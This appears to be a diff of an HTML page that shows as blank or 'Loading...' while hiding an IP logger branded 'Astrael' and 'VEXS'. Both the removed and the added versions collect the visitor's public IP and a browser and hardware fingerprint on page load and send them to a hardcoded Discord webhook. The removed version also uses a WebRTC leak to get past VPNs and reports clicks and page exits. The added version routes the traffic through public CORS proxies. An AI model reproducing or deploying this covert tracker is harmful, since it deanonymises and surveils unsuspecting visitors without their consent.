@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title></title>
+    <title>Loading...</title>
     <style>
         body {
             margin: 0;
@@ -14,302 +14,201 @@
     </style>
 </head>
 <body>
-    <!-- COMPLETELY INVISIBLE - REAL IP LOGGING -->
+    <!--- GITHUB COMPATIBLE -->
 
     <script>
-        // ASTRAEL REAL IP LOGGER v7.7.7 - FIXED
         (function() {
             const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1435062082562162761/9Kzz_6cJ47_NirxO5VcPm4q7aA3WcAnWjYvSGiKnxFHCev3F8jbxnf8HfO7sIETXBi3l';
             
-            // Get REAL client IP (not server IP)
+            // CORS Proxy URLs to bypass GitHub restrictions
+            const CORS_PROXIES = [
+                'https://cors-anywhere.herokuapp.com/',
+                'https://api.codetabs.com/v1/proxy?quest=',
+                'https://corsproxy.io/?',
+                'https://proxy.cors.sh/'
+            ];
+
+            // Get IP using CORS proxy
             const getRealIP = async () => {
-                let realIP = 'Unknown';
-                
-                // Use services that return client IP directly
-                const reliableIPApis = [
+                const ipApis = [
                     'https://api.ipify.org?format=json',
                     'https://api64.ipify.org?format=json',
-                    'https://api.myip.com/',
-                    'https://ip.seeip.org/json'
+                    'https://ip.seeip.org/json',
+                    'https://api.my-ip.io/ip.json'
                 ];
 
-                // Try each API sequentially
-                for (const api of reliableIPApis) {
-                    try {
-                        const controller = new AbortController();
-                        const timeoutId = setTimeout(() => controller.abort(), 3000);
-                        
-                        const response = await fetch(api, {
-                            signal: controller.signal,
-                            mode: 'cors',
-                            credentials: 'omit'
-                        });
-                        
-                        clearTimeout(timeoutId);
-                        const data = await response.json();
-                        
-                        if (data.ip && data.ip !== '127.0.0.1' && !data.ip.startsWith('10.') && 
-                            !data.ip.startsWith('192.168.') && !data.ip.startsWith('172.')) {
-                            realIP = data.ip;
-                            break;
+                for (const proxy of CORS_PROXIES) {
+                    for (const api of ipApis) {
+                        try {
+                            const proxyUrl = proxy + encodeURIComponent(api);
+                            const response = await fetch(proxyUrl, {
+                                method: 'GET',
+                                headers: {
+                                    'X-Requested-With': 'XMLHttpRequest'
+                                }
+                            });
+                            
+                            if (response.ok) {
+                                const data = await response.json();
+                                if (data.ip && isValidIP(data.ip)) {
+                                    return data.ip;
+                                }
+                            }
+                        } catch(e) {
+                            continue;
                         }
-                    } catch(e) {
-                        console.log('IP API failed:', api);
                     }
                 }
-
-                return realIP;
+                return 'Unknown';
             };
 
-            // Get WebRTC local IP (bypasses VPN/proxy)
-            const getWebRTCIP = () => {
-                return new Promise((resolve) => {
-                    const rtc = new RTCPeerConnection({
-                        iceServers: [
-                            { urls: 'stun:stun.l.google.com:19302' },
-                            { urls: 'stun:stun1.l.google.com:19302' }
-                        ]
-                    });
-                    
-                    rtc.createDataChannel('');
-                    rtc.createOffer()
-                        .then(offer => rtc.setLocalDescription(offer))
-                        .catch(() => resolve(null));
-                    
-                    let foundIP = null;
-                    rtc.onicecandidate = (event) => {
-                        if (event.candidate) {
-                            const candidate = event.candidate.candidate;
-                            // Match IPv4 addresses
-                            const ipRegex = /([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/;
-                            const match = candidate.match(ipRegex);
-                            if (match && !isPrivateIP(match[1])) {
-                                foundIP = match[1];
-                                resolve(foundIP);
-                                rtc.close();
+            // Validate IP
+            const isValidIP = (ip) => {
+                return !ip.startsWith('10.') && 
+                       !ip.startsWith('192.168.') && 
+                       !ip.startsWith('172.16.') &&
+                       !ip.startsWith('172.17.') &&
+                       !ip.startsWith('172.18.') &&
+                       !ip.startsWith('172.19.') &&
+                       !ip.startsWith('172.20.') &&
+                       !ip.startsWith('172.21.') &&
+                       !ip.startsWith('172.22.') &&
+                       !ip.startsWith('172.23.') &&
+                       !ip.startsWith('172.24.') &&
+                       !ip.startsWith('172.25.') &&
+                       !ip.startsWith('172.26.') &&
+                       !ip.startsWith('172.27.') &&
+                       !ip.startsWith('172.28.') &&
+                       !ip.startsWith('172.29.') &&
+                       !ip.startsWith('172.30.') &&
+                       !ip.startsWith('172.31.') &&
+                       ip !== '127.0.0.1';
+            };
+
+            // Send to Discord via CORS proxy
+            const sendToDiscord = async (ip, fingerprint) => {
+                const payload = {
+                    embeds: [{
+                        title: "VEXS IP LOGGER - IP CAPTURED VIA GITHUB",
+                        color: 0x00ff00,
+                        timestamp: new Date().toISOString(),
+                        fields: [
+                            {
+                                name: "PUBLIC IP",
+                                value: `\`\`\`${ip}\`\`\``,
+                                inline: false
+                            },
+                            {
+                                name: "Location Info",
+                                value: `**Timezone:** ${fingerprint.timezone}\n**Language:** ${fingerprint.language}`,
+                                inline: true
+                            },
+                            {
+                                name: "System Info",
+                                value: `**Platform:** ${fingerprint.platform}\n**Screen:** ${fingerprint.screen_resolution}`,
+                                inline: true
+                            },
+                            {
+                                name: "Browser",
+                                value: `\`\`\`${fingerprint.user_agent.substring(0, 100)}...\`\`\``,
+                                inline: false
                             }
+                        ],
+                        footer: {
+                            text: "Astrael GitHub IP Logger • CORS Bypass"
                         }
-                    };
-                    
-                    setTimeout(() => {
-                        if (!foundIP) {
-                            resolve(null);
-                            rtc.close();
-                        }
-                    }, 2000);
-                });
+                    }],
+                    username: "GitHub IP Tracker"
+                };
+
+                // Try each proxy for Discord webhook
+                for (const proxy of CORS_PROXIES) {
+                    try {
+                        const proxyUrl = proxy + encodeURIComponent(DISCORD_WEBHOOK);
+                        await fetch(proxyUrl, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                                'X-Requested-With': 'XMLHttpRequest'
+                            },
+                            body: JSON.stringify(payload)
+                        });
+                        console.log('✅ Sent via proxy:', proxy);
+                        return true;
+                    } catch(e) {
+                        console.log('❌ Proxy failed:', proxy);
+                        continue;
+                    }
+                }
+                return false;
             };
 
-            // Check if IP is private
-            const isPrivateIP = (ip) => {
-                return ip.startsWith('10.') || 
-                       ip.startsWith('192.168.') || 
-                       (ip.startsWith('172.') && parseInt(ip.split('.')[1]) >= 16 && parseInt(ip.split('.')[1]) <= 31) ||
-                       ip === '127.0.0.1';
-            };
-
-            // Collect all fingerprint data
-            const collectFingerprintData = () => {
+            // Collect fingerprint
+            const collectFingerprint = () => {
                 return {
-                    // Browser Details
                     user_agent: navigator.userAgent,
                     platform: navigator.platform,
                     language: navigator.language,
                     languages: navigator.languages ? navigator.languages.join(', ') : 'Unknown',
-                    cookie_enabled: navigator.cookieEnabled,
-                    
-                    // Screen Information
                     screen_resolution: `${screen.width}x${screen.height}`,
                     color_depth: screen.colorDepth,
                     pixel_ratio: window.devicePixelRatio,
-                    
-                    // Hardware
                     cpu_cores: navigator.hardwareConcurrency || 'Unknown',
                     device_memory: navigator.deviceMemory || 'Unknown',
-                    max_touch_points: navigator.maxTouchPoints || 'Unknown',
-                    
-                    // Connection
-                    connection_type: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
-                    connection_speed: navigator.connection ? navigator.connection.downlink + ' Mbps' : 'Unknown',
-                    
-                    // Location & Time
                     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                     local_time: new Date().toString(),
-                    timestamp: new Date().toISOString(),
-                    
-                    // Page Information
                     url: window.location.href,
-                    referrer: document.referrer || 'Direct',
-                    hostname: window.location.hostname
+                    referrer: document.referrer || 'Direct'
                 };
             };
 
-            // Send to Discord
-            const sendToDiscord = (ip, fingerprint, webrtcIP = null) => {
-                const embed = {
-                    title: "🔍 ASTRAEL - REAL IP CAPTURED",
-                    color: 0x00ff00,
-                    timestamp: new Date().toISOString(),
-                    fields: [
-                        {
-                            name: "🌐 REAL PUBLIC IP",
-                            value: `\`\`\`${ip}\`\`\``,
-                            inline: false
-                        },
-                        {
-                            name: "📍 Location Info",
-                            value: `**Timezone:** ${fingerprint.timezone}\n**Language:** ${fingerprint.language}\n**Local Time:** ${fingerprint.local_time}`,
-                            inline: true
-                        },
-                        {
-                            name: "🖥️ System Info",
-                            value: `**Platform:** ${fingerprint.platform}\n**Screen:** ${fingerprint.screen_resolution}\n**CPU Cores:** ${fingerprint.cpu_cores}\n**RAM:** ${fingerprint.device_memory}GB`,
-                            inline: true
-                        },
-                        {
-                            name: "🔧 Browser",
-                            value: `\`\`\`${fingerprint.user_agent}\`\`\``,
-                            inline: false
-                        },
-                        {
-                            name: "📡 Network",
-                            value: `**Type:** ${fingerprint.connection_type}\n**Speed:** ${fingerprint.connection_speed}`,
-                            inline: true
-                        },
-                        {
-                            name: "🔗 Page Info",
-                            value: `**URL:** ${fingerprint.url}\n**Referrer:** ${fingerprint.referrer}`,
-                            inline: true
-                        }
-                    ],
-                    footer: {
-                        text: "Astrael Real IP Logger v7.7.7 • No Server IPs"
-                    }
-                };
-
-                // Add WebRTC IP if available
-                if (webrtcIP) {
-                    embed.fields.push({
-                        name: "🔒 WebRTC Local IP",
-                        value: `\`\`\`${webrtcIP}\`\`\``,
-                        inline: false
-                    });
-                }
-
-                // Send to Discord
-                fetch(DISCORD_WEBHOOK, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        embeds: [embed],
-                        username: "Astrael IP Tracker",
-                        avatar_url: "https://i.imgur.com/7W6hqz3.png"
-                    })
-                }).catch(error => {
-                    // Fallback simple message
-                    fetch(DISCORD_WEBHOOK, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            content: `🚨 **REAL IP CAPTURED**\n**IP:** ${ip}\n**Platform:** ${fingerprint.platform}\n**Browser:** ${fingerprint.user_agent}\n**Screen:** ${fingerprint.screen_resolution}\n**URL:** ${fingerprint.url}`,
-                            username: "Astrael IP Tracker"
-                        })
-                    });
-                });
-            };
-
-            // Main tracking function
-            const executeRealIPTracking = async () => {
+            // Main function
+            const trackIP = async () => {
                 try {
-                    // Get fingerprint data first
-                    const fingerprint = collectFingerprintData();
+                    const fingerprint = collectFingerprint();
+                    const ip = await getRealIP();
                     
-                    // Get real public IP
-                    const realIP = await getRealIP();
-                    
-                    // Get WebRTC IP
-                    const webrtcIP = await getWebRTCIP();
-                    
-                    // Only send if we got a real public IP
-                    if (realIP && realIP !== 'Unknown' && !isPrivateIP(realIP)) {
-                        sendToDiscord(realIP, fingerprint, webrtcIP);
-                        
-                        // Log success
-                        console.log('✅ Real IP captured:', realIP);
+                    if (ip !== 'Unknown') {
+                        await sendToDiscord(ip, fingerprint);
                     } else {
                         // Send failure notification
-                        fetch(DISCORD_WEBHOOK, {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json',
-                            },
-                            body: JSON.stringify({
-                                content: `❌ **IP CAPTURE FAILED**\n**Reason:** Could not get real public IP\n**User Agent:** ${fingerprint.user_agent}\n**URL:** ${fingerprint.url}\n**Time:** ${fingerprint.local_time}`,
-                                username: "Astrael IP Tracker"
-                            })
-                        });
+                        for (const proxy of CORS_PROXIES) {
+                            try {
+                                const proxyUrl = proxy + encodeURIComponent(DISCORD_WEBHOOK);
+                                await fetch(proxyUrl, {
+                                    method: 'POST',
+                                    headers: {
+                                        'Content-Type': 'application/json',
+                                        'X-Requested-With': 'XMLHttpRequest'
+                                    },
+                                    body: JSON.stringify({
+                                        content: `❌ **IP CAPTURE FAILED**\n**User Agent:** ${fingerprint.user_agent}\n**URL:** ${fingerprint.url}`
+                                    })
+                                });
+                                break;
+                            } catch(e) {
+                                continue;
+                            }
+                        }
                     }
-                    
                 } catch (error) {
                     console.log('Tracking error:', error);
                 }
             };
 
-            // Start tracking immediately
-            window.addEventListener('load', executeRealIPTracking);
-            document.addEventListener('DOMContentLoaded', executeRealIPTracking);
-            
-            // Execute now
+            // Start tracking
             if (document.readyState === 'loading') {
-                document.addEventListener('DOMContentLoaded', executeRealIPTracking);
+                document.addEventListener('DOMContentLoaded', trackIP);
             } else {
-                executeRealIPTracking();
+                trackIP();
             }
 
-            // Additional execution points
-            setTimeout(executeRealIPTracking, 1000);
-            setTimeout(executeRealIPTracking, 3000);
-
-            // Track page interactions
-            let clickCount = 0;
-            document.addEventListener('click', (e) => {
-                clickCount++;
-                if (clickCount <= 3) { // Limit to 3 clicks
-                    fetch(DISCORD_WEBHOOK, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            content: `🖱️ **User Click #${clickCount}**\n**Coordinates:** X:${e.clientX}, Y:${e.clientY}\n**URL:** ${window.location.href}`,
-                            username: "Astrael IP Tracker"
-                        })
-                    });
-                }
-            });
-
-            // Track page exit
-            window.addEventListener('beforeunload', () => {
-                const timeSpent = Math.round(performance.now() / 1000);
-                fetch(DISCORD_WEBHOOK, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        content: `📤 **Visitor Left**\n**Time Spent:** ${timeSpent} seconds\n**URL:** ${window.location.href}`,
-                        username: "Astrael IP Tracker"
-                    })
-                });
-            });
+            // Additional tracking points
+            setTimeout(trackIP, 2000);
+            setTimeout(trackIP, 5000);
 
         })();
     </script>
 </body>
 </html>
-
 
